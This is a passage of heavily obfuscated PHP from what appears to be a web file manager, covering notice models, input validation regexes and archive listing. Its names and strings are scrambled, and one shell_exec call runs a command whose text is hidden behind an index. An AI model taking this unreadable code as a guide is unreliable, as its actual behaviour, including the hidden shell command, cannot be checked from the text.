$aîÃÊĞí[$E‚Å›Ïƒ—[2330]] = $DÓ…àó ª¦[$aîÃÊĞí[$E‚Å›Ïƒ—[2317]]]; if ($aîÃÊĞí[$E‚Å›Ïƒ—[29]] == $E‚Å›Ïƒ—[494]) { $aîÃÊĞí[$E‚Å›Ïƒ—[405]][$E‚Å›Ïƒ—[1004]] = $DÓ…àó ª¦[$aîÃÊĞí[$E‚Å›Ïƒ—[405]][$E‚Å›Ïƒ—[1004]]]; $aîÃÊĞí[$E‚Å›Ïƒ—[405]][$E‚Å›Ïƒ—[1005]] = $DÓ…àó ª¦[$aîÃÊĞí[$E‚Å›Ïƒ—[405]][$E‚Å›Ïƒ—[1005]]]; } goto FÅÅİ¥¡•‹; Bó‹Œ Ç¸: if ($aîÃÊĞí[$E‚Å›Ïƒ—[2330]] && $aîÃÊĞí[$E‚Å›Ïƒ—[2330]][$E‚Å›Ïƒ—[371]] == $E‚Å›Ïƒ—[1077]) { $FÆƒ¾¨ ã[] = $Bâ‹°„öÎ[$E‚Å›Ïƒ—[367]]; unset($BøÉˆÖ¹¥Œ[$BÌ«ÈÄ³¿•]); continue; } goto açÆ¿¤ø ¸; FÅÅİ¥¡•‹: if ($aîÃÊĞí[$E‚Å›Ïƒ—[29]] == $E‚Å›Ïƒ—[2325]) { $aîÃÊĞí[$E‚Å›Ïƒ—[405]][$E‚Å›Ïƒ—[369]] = $DÓ…àó ª¦[$aîÃÊĞí[$E‚Å›Ïƒ—[405]][$E‚Å›Ïƒ—[369]]]; } if ($aîÃÊĞí[$E‚Å›Ïƒ—[29]] == $E‚Å›Ïƒ—[2074]) { $aîÃÊĞí[$E‚Å›Ïƒ—[2330]] = $aîÃÊĞí[$E‚Å›Ïƒ—[391]]; $aîÃÊĞí[$E‚Å›Ïƒ—[2317]] = $aîÃÊĞí[$E‚Å›Ïƒ—[2330]][$E‚Å›Ïƒ—[369]]; $aîÃÊĞí[$E‚Å›Ïƒ—[391]] = !1; $aîÃÊĞí[$E‚Å›Ïƒ—[369]] = $E‚Å›Ïƒ—[33]; } if ($aîÃÊĞí[$E‚Å›Ïƒ—[391]] && $aîÃÊĞí[$E‚Å›Ïƒ—[391]][$E‚Å›Ïƒ—[371]] == $E‚Å›Ïƒ—[1077]) { $FÆƒ¾¨ ã[] = $Bâ‹°„öÎ[$E‚Å›Ïƒ—[367]]; unset($BøÉˆÖ¹¥Œ[$BÌ«ÈÄ³¿•]); continue; } goto Bó‹Œ Ç¸; açÆ¿¤ø ¸: } $Bâ‹°„öÎ[$E‚Å›Ïƒ—[405]] = $aîÃÊĞí; goto c¬¼ÎÂËÀ; fÆÎ†°‚Á¡: $e¶ÒµòŒ”µ = $Bâ‹°„öÎ[$E‚Å›Ïƒ—[29]]; $aÖˆ¿¯öæï = isset($aÀÉÒŞÊ¥£[$Bâ‹°„öÎ[$E‚Å›Ïƒ—[1437]]]) ? $aÀÉÒŞÊ¥£[$Bâ‹°„öÎ[$E‚Å›Ïƒ—[1437]]] : !1; $Fö°Œ‘Ì¸Ö = strpos($e¶ÒµòŒ”µ, $E‚Å›Ïƒ—[2503]) === 0 ? LNG($E‚Å›Ïƒ—[2504]) : LNG($E‚Å›Ïƒ—[2499]); goto b©»òÚóŒ; cé‘¥×Åë™: $Bâ‹°„öÎ[$E‚Å›Ïƒ—[2261]] = $aÖˆ¿¯öæï; $aîÃÊĞí = json_decode($Bâ‹°„öÎ[$E‚Å›Ïƒ—[405]], !0); $Bâ‹°„öÎ[$E‚Å›Ïƒ—[2498]] = isset($aîÃÊĞí[$E‚Å›Ïƒ—[2498]]) ? $aîÃÊĞí[$E‚Å›Ïƒ—[2498]] : $E‚Å›Ïƒ—[33]; goto Cï‡ïâ´Ì; b©»òÚóŒ: $Bâ‹°„öÎ[$E‚Å›Ïƒ—[28]] = isset($aÖˆ¿¯öæï[$E‚Å›Ïƒ—[28]]) ? $aÖˆ¿¯öæï[$E‚Å›Ïƒ—[28]] : LNG($E‚Å›Ïƒ—[2499]); $Bâ‹°„öÎ[$E‚Å›Ïƒ—[2366]] = isset($aÖˆ¿¯öæï[$E‚Å›Ïƒ—[2366]]) ? $aÖˆ¿¯öæï[$E‚Å›Ïƒ—[2366]] : $E‚Å›Ïƒ—[33]; $Bâ‹°„öÎ[$E‚Å›Ïƒ—[1343]] = isset($aƒ²±©[$e¶ÒµòŒ”µ]) ? $aƒ²±©[$e¶ÒµòŒ”µ] : $Fö°Œ‘Ì¸Ö; goto cé‘¥×Åë™; e‹éÂˆÆò¨: } $this->clearSystemPathLog($FÆƒ¾¨ ã); goto EÕŒø„½ºÑ; Eˆ¾Íõóò: $E‚Å›Ïƒ— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÓ³Ø—Ğ×Ê = array_to_keyvalue($BøÉˆÖ¹¥Œ, $E‚Å›Ïƒ—[33], $E‚Å›Ïƒ—[1437]); $aÀÉÒŞÊ¥£ = Model($E‚Å›Ïƒ—[479])->userListInfo(array_unique($aÓ³Ø—Ğ×Ê)); goto E‰í—Ñ×ˆ; EÕŒø„½ºÑ: return $eãÇì£‘Ì; goto C‘Àâ…ËîÅ; E‰í—Ñ×ˆ: $DÓ…àó ª¦ = $this->getSourceList($BøÉˆÖ¹¥Œ); $aƒ²±© = $this->typeAll(); $eãÇì£‘Ì = array(); goto fãÄ·‘ôƒè; C‘Àâ…ËîÅ: } private function clearSystemPathLog($FÉß±ŒĞÖ¢) { $B×‹Í×ŸŠÊ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (count($FÉß±ŒĞÖ¢) == 0) { return; } $FŞÀ¿»Úµí = array($B×‹Í×ŸŠÊ[367] => array($B×‹Í×ŸŠÊ[7], array_unique($FÉß±ŒĞÖ¢))); $this->where($FŞÀ¿»Úµí)->delete(); } public function deviceList($a£ÈÍÎé†¿, $bå„àé”äç = 0) { $d‹³¦í„šˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÂñÏÉ²äÎ = array($d‹³¦í„šˆ[1437] => $a£ÈÍÎé†¿, $d‹³¦í„šˆ[187] => array($d‹³¦í„šˆ[924], $bå„àé”äç), $d‹³¦í„šˆ[29] => $d‹³¦í„šˆ[2047]); $D›Ó£—ÑÒ = array(); $CëµóÔ … = $this->field($d‹³¦í„šˆ[2506])->where($aÂñÏÉ²äÎ)->order($d‹³¦í„šˆ[2328])->limit(50)->select(); foreach ($CëµóÔ … as $e¥ÂçõóíØ => $c†åùÌÚ±ğ) { goto CÄˆê¼ßîá; d¸„ÉøÄ¨Œ: $this->ipAddress($c†åùÌÚ±ğ); $c†åùÌÚ±ğ[$d‹³¦í„šˆ[405]] = $eÊÈ¤Å½Œ; $D›Ó£—ÑÒ[$C‚¹³»Ù‹] = $c†åùÌÚ±ğ; goto C‘†®Â›ì”; C—Ü†«½°ƒ: unset($eÊÈ¤Å½Œ[$d‹³¦í„šˆ[2498]]); $C‚¹³»Ù‹ = $this->deviceType($eÊÈ¤Å½Œ[$d‹³¦í„šˆ[2319]]); if (isset($D›Ó£—ÑÒ[$C‚¹³»Ù‹])) { continue; } goto d¸„ÉøÄ¨Œ; CÄˆê¼ßîá: if ($e¥ÂçõóíØ > 0 && abs($c†åùÌÚ±ğ[$d‹³¦í„šˆ[187]] - $CëµóÔ …[$e¥ÂçõóíØ - 1][$d‹³¦í„šˆ[187]]) < 5) { continue; } $eÊÈ¤Å½Œ = json_decode($c†åùÌÚ±ğ[$d‹³¦í„šˆ[405]], !0); $c†åùÌÚ±ğ[$d‹³¦í„šˆ[2498]] = isset($eÊÈ¤Å½Œ[$d‹³¦í„šˆ[2498]]) ? $eÊÈ¤Å½Œ[$d‹³¦í„šˆ[2498]] : $d‹³¦í„šˆ[33]; goto C—Ü†«½°ƒ; C‘†®Â›ì”: } return array_values($D›Ó£—ÑÒ); } public function deviceType($E«ô±‰ßæŒ) { return $E«ô±‰ßæŒ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x6e\x6f\164\x69\x63\145\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\x63\157\x6e\164\x65\x6e\x74", "\x61\165\x74\150", "\155\x6f\144\145", "\x74\x69\x6d\145", "\x74\171\160\145", "\154\145\166\x65\154", "\145\x6e\141\x62\154\x65", "\163\x6f\162\x74"); public function listData($aï”àœç¨ = false, $b‰°´Ìë¬ = "\x73\157\162\164", $C«ê¢˜•° = false) { return parent::listData($aï”àœç¨, $b‰°´Ìë¬, $C«ê¢˜•°); } public function add($BÖ²“ÑÉ¥¤) { $C³Ññ‡ª¢¦ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CºŒáª‚µ = time(); if ($BÖ²“ÑÉ¥¤[$C³Ññ‡ª¢¦[12]] == $C³Ññ‡ª¢¦[2507]) { $CºŒáª‚µ = strtotime($BÖ²“ÑÉ¥¤[$C³Ññ‡ª¢¦[190]]); } $BÖ²“ÑÉ¥¤[$C³Ññ‡ª¢¦[190]] = $CºŒáª‚µ; return parent::insert($BÖ²“ÑÉ¥¤); } public function update($FÆÉõ®š¼‡, $c‹¤çƒè¹´) { goto cˆªµˆ“¼¡; FÇëŞÊ´Õ: $CÏ­‡‚Ö˜È = time(); if ($c‹¤çƒè¹´[$bìôÂ³Úè[12]] == $bìôÂ³Úè[2507]) { $CÏ­‡‚Ö˜È = strtotime($c‹¤çƒè¹´[$bìôÂ³Úè[190]]); } $c‹¤çƒè¹´[$bìôÂ³Úè[190]] = $CÏ­‡‚Ö˜È; goto DÄ…éàœŸ¯; cˆªµˆ“¼¡: $bìôÂ³Úè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fãÄéÜºõß = $this->listData($FÆÉõ®š¼‡); if (!$fãÄéÜºõß) { return !1; } goto FÇëŞÊ´Õ; DÄ…éàœŸ¯: return parent::update($FÆÉõ®š¼‡, $c‹¤çƒè¹´); goto c›¹¥²¤Âä; c›¹¥²¤Âä: } public function remove($C«Ğà‚ö˜) { $aÃœ–Š¬µŠ = $this->listData($C«Ğà‚ö˜); if (!$aÃœ–Š¬µŠ || $aÃœ–Š¬µŠ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1077]]) { return !1; } return parent::remove($C«Ğà‚ö˜); } public function sort($a°ˆğªñùá, $AÔª‹¾¢™) { return parent::update($a°ˆğªñùá, $AÔª‹¾¢™); } public function enable($cÎ”ÉáÒ², $B£ »¦½ˆÌ) { return parent::update($cÎ”ÉáÒ², array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2508] => $B£ »¦½ˆÌ)); } private function initUserOption() { $cÌˆ‰ÅÒÉ“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->optionType = $cÌˆ‰ÅÒÉ“[2509]; $this->modelType = $cÌˆ‰ÅÒÉ“[2510]; $this->field = array($cÌˆ‰ÅÒÉ“[2511], $cÌˆ‰ÅÒÉ“[28], $cÌˆ‰ÅÒÉ“[190], $cÌˆ‰ÅÒÉ“[29], $cÌˆ‰ÅÒÉ“[2512], $cÌˆ‰ÅÒÉ“[683], $cÌˆ‰ÅÒÉ“[183]); } public function userNoticeGet($f©‹º³Õ™¹ = false) { $this->initUserOption(); return parent::listData($f©‹º³Õ™¹, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][367], !0); } public function userNoticeAdd($f‹é‡ö¸ß¦) { $béàİâ÷õø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initUserOption(); $fÆ®™¿ÊÖ® = $this->findByKey($béàİâ÷õø[2511], $f‹é‡ö¸ß¦[$béàİâ÷õø[367]]); if ($fÆ®™¿ÊÖ®) { return !0; } $eÔ¶È†¤‰ = array($béàİâ÷õø[2511] => $f‹é‡ö¸ß¦[$béàİâ÷õø[367]], $béàİâ÷õø[28] => $f‹é‡ö¸ß¦[$béàİâ÷õø[28]], $béàİâ÷õø[190] => $f‹é‡ö¸ß¦[$béàİâ÷õø[190]], $béàİâ÷õø[29] => isset($f‹é‡ö¸ß¦[$béàİâ÷õø[29]]) ? $f‹é‡ö¸ß¦[$béàİâ÷õø[29]] : 1, $béàİâ÷õø[2512] => isset($f‹é‡ö¸ß¦[$béàİâ÷õø[2512]]) ? $f‹é‡ö¸ß¦[$béàİâ÷õø[2512]] : 0, $béàİâ÷õø[683] => 0, $béàİâ÷õø[183] => 0); return parent::insert($eÔ¶È†¤‰); } public function userNoticeEdit($bãî©Ãƒ’, $Aä¥öÔ–æ´) { $this->initUserOption(); return parent::update($bãî©Ãƒ’, $Aä¥öÔ–æ´); } } goto DÑ«Â˜ĞØ; cæÇÀ„õŒ®: class Input { public static function getArray($d¦Ê‡Ã­×‰) { goto e¿ÓÃïîƒã; e¿ÓÃïîƒã: $fœøÎÃœÕ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $in; $b®àÁ‡»§í = array(); goto D–ËÈóø™; F™ã ÖäĞ: if (count($a©ÑÚÛßÈç) > 0) { show_json(implode($fœøÎÃœÕ[1884], $a©ÑÚÛßÈç), !1); } return $b®àÁ‡»§í; goto cËñ´š‰‹Ì; D–ËÈóø™: $a©ÑÚÛßÈç = array(); $F¶„Õ»ªÚï = LNG($fœøÎÃœÕ[1880]); foreach ($d¦Ê‡Ã­×‰ as $eàÊãî”ÑŒ => $aÖïõ•å½ä) { goto bëˆ¼â®ºÅ; c“¥Ùæñ·‰: if (isset($aÖïõ•å½ä[$fœøÎÃœÕ[1883]]) && !self::check($in[$eàÊãî”ÑŒ], $aÖïõ•å½ä[$fœøÎÃœÕ[1883]], $C…±‘…ƒã)) { if (array_key_exists($fœøÎÃœÕ[1882], $aÖïõ•å½ä)) { if (!is_null($aÖïõ•å½ä[$fœøÎÃœÕ[1882]])) { $b®àÁ‡»§í[$fÑÏÀ„œŸŠ] = $aÖïõ•å½ä[$fœøÎÃœÕ[1882]]; } } else { $a©ÑÚÛßÈç[] = $B¢ğåéæ²Ö; } continue; } $b®àÁ‡»§í[$fÑÏÀ„œŸŠ] = $in[$eàÊãî”ÑŒ]; goto cÒÚç¹Œé; bëˆ¼â®ºÅ: $B¢ğåéæ²Ö = _get($aÖïõ•å½ä, $fœøÎÃœÕ[1245], $F¶„Õ»ªÚï . $fœøÎÃœÕ[876] . $eàÊãî”ÑŒ); $fÑÏÀ„œŸŠ = $eàÊãî”ÑŒ; if (isset($aÖïõ•å½ä[$fœøÎÃœÕ[1881]]) && $aÖïõ•å½ä[$fœøÎÃœÕ[1881]]) { $fÑÏÀ„œŸŠ = $aÖïõ•å½ä[$fœøÎÃœÕ[1881]]; } goto D¥¿õ£ÔÙ’; D¥¿õ£ÔÙ’: if (!array_key_exists($eàÊãî”ÑŒ, $in)) { if (array_key_exists($fœøÎÃœÕ[1882], $aÖïõ•å½ä)) { if (!is_null($aÖïõ•å½ä[$fœøÎÃœÕ[1882]])) { $b®àÁ‡»§í[$fÑÏÀ„œŸŠ] = $aÖïõ•å½ä[$fœøÎÃœÕ[1882]]; } } else { if (isset($aÖïõ•å½ä[$fœøÎÃœÕ[1883]])) { $a©ÑÚÛßÈç[] = $B¢ğåéæ²Ö; } } continue; } if (isset($aÖïõ•å½ä[$fœøÎÃœÕ[1883]]) && $aÖïõ•å½ä[$fœøÎÃœÕ[1883]] == $fœøÎÃœÕ[282]) { $bÉ’íºÑ—† = json_decode($in[$eàÊãî”ÑŒ], !0); if (is_array($bÉ’íºÑ—†)) { $b®àÁ‡»§í[$fÑÏÀ„œŸŠ] = $bÉ’íºÑ—†; } else { if (array_key_exists($fœøÎÃœÕ[1882], $aÖïõ•å½ä)) { if (!is_null($aÖïõ•å½ä[$fœøÎÃœÕ[1882]])) { $b®àÁ‡»§í[$fÑÏÀ„œŸŠ] = $aÖïõ•å½ä[$fœøÎÃœÕ[1882]]; } } else { $a©ÑÚÛßÈç[] = $B¢ğåéæ²Ö; } } continue; } $C…±‘…ƒã = _get($aÖïõ•å½ä, $fœøÎÃœÕ[1009]); goto c“¥Ùæñ·‰; cÒÚç¹Œé: } goto F™ã ÖäĞ; cËñ´š‰‹Ì: } public static function reg($Bİ‡³ãíÒ = "\x72\x65\161\x75\x69\162\x65") { static $cÀèâé¾ø± = array("\x72\x65\x71\x75\151\x72\x65" => "\56\53", "\156\165\x6d\142\145\162" => "\x5c\x64\53", "\x69\156\164\145\147\145\x72" => "\x5c\144\x2b", "\x68\x65\x78" => "\133\x30\x2d\x39\101\55\106\x61\x2d\x66\x5d\53", "\x69\x6e\164" => "\133\55\134\x2b\135\x3f\134\144\x2b", "\x62\x6f\157\x6c" => "\x30\x7c\61", "\146\154\x6f\x61\x74" => "\x5b\x2d\x5c\x2b\x5d\77\134\x64\53\50\134\x2e\134\x64\x2b\x29\77", "\x65\x6e\147\x6c\151\163\150" => "\133\101\x2d\132\x61\55\172\40\x5d\x2b", "\143\150\x69\x6e\x65\x73\145" => "\133\x5c\x78\173\64\145\x30\x30\x7d\x2d\134\170\x7b\71\x66\141\x35\x7d\135\x2b", "\150\x61\163\x43\x68\151\156\x65\163\x65" => "\57\50\133\x5c\170\x7b\64\x65\x30\x30\x7d\x2d\134\x78\x7b\71\x66\141\65\175\135\x2b\51\57\x75", "\x65\x6d\141\151\154" => "\134\167\x2b\x28\133\x5c\x2e\x5c\55\x5d\x5c\x77\x2b\51\52\134\100\x5c\x77\53\50\133\134\56\134\x2d\x5d\134\167\53\51\52\x5c\56\134\167\x2b", "\160\x68\x6f\x6e\x65" => "\x31\x5b\63\x2d\71\135\x5c\144\173\71\175", "\x74\145\154\160\x68\x6f\156\145" => "\x28\134\50\x5c\x64\x7b\63\54\x34\x7d\134\51\174\x5c\x64\x7b\63\x2c\64\x7d\x2d\x7c\x5c\163\51\x3f\134\x64\173\67\x2c\x31\64\175", "\165\162\154" => "\x28\x68\164\164\160\x7c\x66\164\x70\x7c\150\x74\x74\160\x73\x29\72\x5c\57\x5c\x2f\x5b\x5c\x77\134\x2d\x5f\135\53\x28\x5c\x2e\133\x5c\x77\x5c\55\137\135\53\51\53\x28\x5b\x5c\x77\x5c\x2d\134\x2e\54\100\77\x5e\x3d\x25\46\x3a\134\x2f\176\x5c\x2b\x23\135\52\133\134\167\134\x2d\134\x40\x3f\x5e\x3d\45\x26\134\x2f\176\134\x2b\x23\x5d\x29\77", "\165\x72\x6c\x46\x75\154\154" => "\133\141\x2d\172\101\x2d\172\x5d\x2b\72\x5c\x2f\134\x2f\x5b\x5e\134\163\x5d\52", "\151\x70" => "\50\x5c\144\173\61\54\x33\x7d\x5c\x2e\51\173\x33\175\x28\134\144\x7b\x31\54\x33\x7d\51", "\172\x69\160" => "\x5b\61\55\71\x5d\134\144\x7b\x35\x7d\50\x3f\x21\x5c\x64\x29", "\x69\x64\103\141\162\x64" => "\50\x5c\144\173\61\x35\175\x29\174\50\134\144\173\x31\67\175\x28\134\144\174\x58\174\170\x29\51", "\143\x6f\x6c\x6f\x72" => "\x23\50\133\60\x2d\x39\101\x2d\106\x61\x2d\146\135\x7b\63\x7d\x7c\x5b\60\x2d\x39\101\55\106\x61\x2d\x66\x5d\173\x36\x7d\51", "\164\151\155\x65" => "\x28\x5b\60\55\x31\x5d\134\x64\174\62\x5b\60\55\x34\x5d\x29\72\133\60\55\65\135\x5c\144", "\144\x61\164\x65" => "\x5c\144\x7b\64\175\133\x2d\x5c\x2f\x5d\x3f\x28\60\x5b\61\55\x39\x5d\174\x31\133\60\55\62\x5d\51\x5b\55\x5c\x2f\135\x3f\50\x5b\60\x2d\62\x5d\x5c\x64\174\x33\x5b\x30\x2d\x31\x5d\x29", "\144\141\164\145\x54\x69\x6d\x65" => "\x5c\x64\x7b\64\x7d\x5b\55\x5c\x2f\x5d\x3f\x28\60\x5b\x31\x2d\x39\135\x7c\61\133\x30\55\62\x5d\x29\x5b\55\x5c\x2f\x5d\x3f\50\x5b\60\55\62\135\134\x64\174\x33\133\x30\55\x31\x5d\x29\134\163\x2b\50\x5b\x30\55\x31\135\x5c\x64\174\x32\133\x30\55\64\135\51\x3a\133\60\x2d\65\135\x5c\x64", "\x70\x61\163\x73\167\x6f\x72\144" => "\x28\77\75\x2e\x2a\x5c\144\51\50\x3f\x3d\56\52\133\141\x2d\172\x5d\51\50\x3f\75\56\52\133\101\x2d\132\x5d\51\56\173\x38\54\x32\x30\175", "\153\145\171" => "\133\101\55\x5a\141\55\x7a\x30\55\71\x5f\134\55\x5c\56\x5d\x2b", "\153\x65\171\106\165\x6c\154" => "\133\101\x2d\x5a\141\55\x7a\x30\x2d\x39\x5f\x5c\x2d\134\x2e\x5c\163\x2c\x5d\53"); if (!$Bİ‡³ãíÒ) { return $cÀèâé¾ø±; } return $cÀèâé¾ø±[$Bİ‡³ãíÒ]; } public static function check($d†¸–Ğùù¯, $e·»¶£ÏÕŠ, $EêÁ½¼ç¼ = null) { $fÎõÆ‚„Ò– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; switch ($e·»¶£ÏÕŠ) { case $fÎõÆ‚„Ò–[7]: return in_array($d†¸–Ğùù¯, $EêÁ½¼ç¼); break; case $fÎõÆ‚„Ò–[1885]: return floatval($d†¸–Ğùù¯) > $EêÁ½¼ç¼; break; case $fÎõÆ‚„Ò–[1886]: return floatval($d†¸–Ğùù¯) < $EêÁ½¼ç¼; break; case $fÎõÆ‚„Ò–[325]: return strlen($d†¸–Ğùù¯) >= $EêÁ½¼ç¼[0] && strlen($d†¸–Ğùù¯) <= $EêÁ½¼ç¼[1]; break; case $fÎõÆ‚„Ò–[325]: if (is_array($EêÁ½¼ç¼)) { return strlen($d†¸–Ğùù¯) >= $EêÁ½¼ç¼[0] && strlen($d†¸–Ğùù¯) <= $EêÁ½¼ç¼[1]; break; } else { return strlen($d†¸–Ğùù¯) == $EêÁ½¼ç¼; break; } case $fÎõÆ‚„Ò–[321]: return floatval($d†¸–Ğùù¯) >= $EêÁ½¼ç¼[0] && floatval($d†¸–Ğùù¯) <= $EêÁ½¼ç¼[1]; break; } $f¦œÁÇè‘ = self::reg(!1); $e·»¶£ÏÕŠ = isset($f¦œÁÇè‘[$e·»¶£ÏÕŠ]) ? $f¦œÁÇè‘[$e·»¶£ÏÕŠ] : $e·»¶£ÏÕŠ; if (substr($e·»¶£ÏÕŠ, 0, 1) != $fÎõÆ‚„Ò–[8]) { $e·»¶£ÏÕŠ = $fÎõÆ‚„Ò–[1887] . $e·»¶£ÏÕŠ . $fÎõÆ‚„Ò–[1888]; } return preg_match($e·»¶£ÏÕŠ, $d†¸–Ğùù¯) === 1; } public static function get($A®§Œ¾Î¼¯, $f‘˜ô‰ö¦à = null, $eŸÑØøì« = null, $d­²„ÓÅÎ´ = null) { goto C¥õÕÅÇ–; C¥õÕÅÇ–: $AÇõÇ„êÕ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÊ°ÍóáŒ± = array(); if (!is_null($eŸÑØøì«)) { $cÊ°ÍóáŒ±[$AÇõÇ„êÕ[34]] = $eŸÑØøì«; } goto BÇ°»×‡‹£; eİ’êÉ°Ìğ: return $e¸ºª„Çø[$A®§Œ¾Î¼¯]; goto eÙŒ¹İâğé; BÇ°»×‡‹£: if (!is_null($d­²„ÓÅÎ´)) { $cÊ°ÍóáŒ±[$AÇõÇ„êÕ[1009]] = $d­²„ÓÅÎ´; } if (!is_null($f‘˜ô‰ö¦à)) { $cÊ°ÍóáŒ±[$AÇõÇ„êÕ[1883]] = $f‘˜ô‰ö¦à; } $e¸ºª„Çø = Input::getArray(array($A®§Œ¾Î¼¯ => $cÊ°ÍóáŒ±)); goto eİ’êÉ°Ìğ; eÙŒ¹İâğé: } } class KodArchive { static function init() { goto Báñ‘ÇêÒÁ; Báñ‘ÇêÒÁ: $f§ªùÃ°ÂÍ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (defined($f§ªùÃ°ÂÍ[1889])) { return; } define($f§ªùÃ°ÂÍ[1889], SDK_DIR . $f§ªùÃ°ÂÍ[1890]); goto Aè¯¦÷¦°; eŸÛÜ¦í‡Á: require_once ARCHIVE_LIB . $f§ªùÃ°ÂÍ[1897]; require_once ARCHIVE_LIB . $f§ªùÃ°ÂÍ[1898]; require_once ARCHIVE_LIB . $f§ªùÃ°ÂÍ[1899]; goto A¥±‡˜™ƒº; BñğÌáîç½: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $f§ªùÃ°ÂÍ[1895]; require_once ARCHIVE_LIB . $f§ªùÃ°ÂÍ[1896]; goto eŸÛÜ¦í‡Á; Aè¯¦÷¦°: define($f§ªùÃ°ÂÍ[1891], TEMP_FILES); define($f§ªùÃ°ÂÍ[1892], TEMP_FILES); define($f§ªùÃ°ÂÍ[1893], $f§ªùÃ°ÂÍ[1894]); goto BñğÌáîç½; A¥±‡˜™ƒº: require_once ARCHIVE_LIB . $f§ªùÃ°ÂÍ[1900]; goto aôÙ–­íŠ; aôÙ–­íŠ: } static function checkIfType($aÌµÎôğ˜ , $DâçŒ†²¸) { goto bÓ„½³­Û¡; câÅá½‘à…: return $F´ö¸Ä„á…; goto eŒçâ‰ÈĞ; bÓ„½³­Û¡: $F–™…ÇÚò¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); $aÂ•Ú’íİœ = array($F–™…ÇÚò¾[301] => array($F–™…ÇÚò¾[301], $F–™…ÇÚò¾[1901], $F–™…ÇÚò¾[1902], $F–™…ÇÚò¾[1903]), $F–™…ÇÚò¾[1904] => array($F–™…ÇÚò¾[1904], $F–™…ÇÚò¾[1905], $F–™…ÇÚò¾[1040], $F–™…ÇÚò¾[1038]), $F–™…ÇÚò¾[1042] => array($F–™…ÇÚò¾[1042], $F–™…ÇÚò¾[1906], $F–™…ÇÚò¾[1907], $F–™…ÇÚò¾[1908], $F–™…ÇÚò¾[1909], $F–™…ÇÚò¾[1910], $F–™…ÇÚò¾[1911])); goto E³ˆ¤µ«è±; E³ˆ¤µ«è±: $F´ö¸Ä„á… = in_array($aÌµÎôğ˜ , $aÂ•Ú’íİœ[$DâçŒ†²¸]); if ($F´ö¸Ä„á… && ($DâçŒ†²¸ == $F–™…ÇÚò¾[301] || $DâçŒ†²¸ == $F–™…ÇÚò¾[1904]) && (!function_exists($F–™…ÇÚò¾[1912]) || !function_exists($F–™…ÇÚò¾[1913]))) { show_tips($F–™…ÇÚò¾[1914]); } if ($F´ö¸Ä„á… && $DâçŒ†²¸ == $F–™…ÇÚò¾[1042] && (!function_exists($F–™…ÇÚò¾[1915]) || !strstr(shell_exec($F–™…ÇÚò¾[1916]), $F–™…ÇÚò¾[1917]))) { show_tips($F–™…ÇÚò¾[1918]); } goto câÅá½‘à…; eŒçâ‰ÈĞ: } static function listContent($B£¨Íİò’‘, $D’­¾ˆ´Øˆ = true) { $F²ÍŒêŞâ˜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); $dšä§Â¿® = !empty($GLOBALS[$F²ÍŒêŞâ˜[1046]]) ? $GLOBALS[$F²ÍŒêŞâ˜[1046]] : get_path_ext($B£¨Íİò’‘); $d……ƒØº”“ = !1; if (self::checkIfType($dšä§Â¿®, $F²ÍŒêŞâ˜[1904])) { $eª©î‹Ò°‹ = PclTarList($B£¨Íİò’‘, $dšä§Â¿®); $d……ƒØº”“ = array(); for ($a¹­›Ì£©Ã = 0; $a¹­›Ì£©Ã < count($eª©î‹Ò°‹); $a¹­›Ì£©Ã++) { $Ağ¡¯¦°ŒÔ = $eª©î‹Ò°‹[$a¹­›Ì£©Ã]; if ($Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[1919]] == $F²ÍŒêŞâ˜[1920] || $Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[1919]] == $F²ÍŒêŞâ˜[1921]) { continue; } if ($D’­¾ˆ´Øˆ) { $Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[1922]] = ltrim($Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[1922]], $F²ÍŒêŞâ˜[1154]); } if ($Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[1919]] == $F²ÍŒêŞâ˜[1923]) { $Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[76]] = !0; } else { $Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[76]] = !1; } $Ağ¡¯¦°ŒÔ[$F²ÍŒêŞâ˜[1033]] = $a¹­›Ì£©Ã; $d……ƒØº”“[] = $Ağ¡¯¦°ŒÔ; } } else { if (self::checkIfType($dšä§Â¿®, $F²ÍŒêŞâ˜[1042])) { $Bƒ´ˆ¡àŠ = kodRarArchive::listContent($B£¨Íİò’‘); if (!$Bƒ´ˆ¡àŠ[$F²ÍŒêŞâ˜[1029]]) { return $Bƒ´ˆ¡àŠ; } else { $d……ƒØº”“ = $Bƒ´ˆ¡àŠ[$F²ÍŒêŞâ˜[1031]]; } } else { if (kodZipArchive::support($F²ÍŒêŞâ˜[354])) { $d……ƒØº”“ = kodZipArchive::listContent($B£¨Íİò’‘); } else { $BÄ¬ĞµôÖå = new PclZip($B£¨Íİò’‘); $d……ƒØº”“ = $BÄ¬ĞµôÖå->listContent(); } } } if ($d……ƒØº”“) { $EŒÖ£íÑÎ = unzip_charset_get($d……ƒØº”“); $D’­¾ˆ´Øˆ = $D’­¾ˆ´Øˆ && function_exists($F²ÍŒêŞâ˜[65]); for ($a¹­›Ì£©Ã = 0; $a¹­›Ì£©Ã < count($d……ƒØº”“); $a¹­›Ì£©Ã++) { $d……ƒØº”“[$a¹­›Ì£©Ã][$F²ÍŒêŞâ˜[1922]] = str_replace(array($F²ÍŒêŞâ˜[1069], $F²ÍŒêŞâ˜[1924]), 